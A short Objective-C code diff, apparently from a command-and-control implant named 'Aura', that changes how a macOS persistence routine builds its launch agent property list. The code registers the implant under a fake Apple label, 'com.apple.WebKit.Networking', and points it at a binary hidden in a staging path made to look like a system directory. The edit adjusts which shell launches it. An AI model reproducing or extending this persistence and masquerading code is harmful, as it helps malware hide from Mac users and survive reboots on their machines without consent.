@@ -1,6 +1,4 @@
 #import "SystemInfoHelper.h"
-#import "C2Task.h"
-#import "NSTask.h"
 
 @implementation SystemInfoHelper
 
@@ -229,10 +227,11 @@
     // Dynamically create the plist
     // TODO: Get the execution path, get the shell path
     // Great! Now we'll write out the PLIST contents persisting Aura.
+    NSString *shellPath = [[[NSProcessInfo processInfo] environment] objectForKey:@"SHELL"] ?: @"/bin/bash";
     NSDictionary *plistContents = @{
         @"Label": @"com.apple.WebKit.Networking",
         @"ProgramArguments": @[
-            @"/bin/bash",
+            shellPath,
             @"-c",
             @"/tmp/var/db/com.apple.xpc.roleaccountd.staging/aura"
         ],
